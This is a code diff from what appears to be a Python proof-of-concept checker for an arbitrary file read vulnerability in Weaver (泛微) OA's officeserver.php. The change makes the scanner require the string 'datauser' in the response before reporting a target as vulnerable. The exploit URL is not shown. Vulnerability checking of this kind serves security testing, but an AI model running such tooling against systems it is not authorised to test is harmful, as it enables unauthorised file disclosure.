@@ -22,7 +22,7 @@ def main(target_url):
     try:
         requests.packages.urllib3.disable_warnings()
         response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
-        if response.status_code== 200:
+        if response.status_code== 200 and 'datauser' in response.text:
             console.print(now_time() + ' [SUCCESS]  存在泛微OA officeserver.php 任意文件读取漏洞:{}'.format(exp_url), style='bold green')
         else:
             console.print(now_time() + " [WARNING]  不存在泛微OA officeserver.php 任意文件读取漏洞", style='bold red')
